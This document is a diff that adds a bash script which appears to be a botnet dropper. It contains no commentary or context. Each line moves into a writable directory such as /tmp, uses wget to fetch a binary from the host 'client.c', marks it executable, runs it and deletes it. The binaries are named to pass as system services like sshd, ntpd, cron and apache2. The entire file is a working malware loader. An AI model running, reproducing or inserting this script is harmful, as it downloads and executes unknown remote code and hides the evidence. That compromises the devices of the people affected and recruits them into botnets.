@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntyntpd; chmod +x cuntyntpd; ./cuntyntpd; rm -rf cuntyntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntysshd; chmod +x cuntysshd; ./cuntysshd; rm -rf cuntysshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntyopenssh; chmod +x cuntyopenssh; ./cuntyopenssh; rm -rf cuntyopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntybash; chmod +x cuntybash; ./cuntybash; rm -rf cuntybash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntytftp; chmod +x cuntytftp; ./cuntytftp; rm -rf cuntytftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntywget; chmod +x cuntywget; ./cuntywget; rm -rf cuntywget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntycron; chmod +x cuntycron; ./cuntycron; rm -rf cuntycron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntyftp; chmod +x cuntyftp; ./cuntyftp; rm -rf cuntyftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntypftp; chmod +x cuntypftp; ./cuntypftp; rm -rf cuntypftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntysh; chmod +x cuntysh; ./cuntysh; rm -rf cuntysh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntyshit; chmod +x cuntyshit; ./cuntyshit; rm -rf cuntyshit
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntyapache2; chmod +x cuntyapache2; ./cuntyapache2; rm -rf cuntyapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://client.c/cuntytelnetd; chmod +x cuntytelnetd; ./cuntytelnetd; rm -rf cuntytelnetd
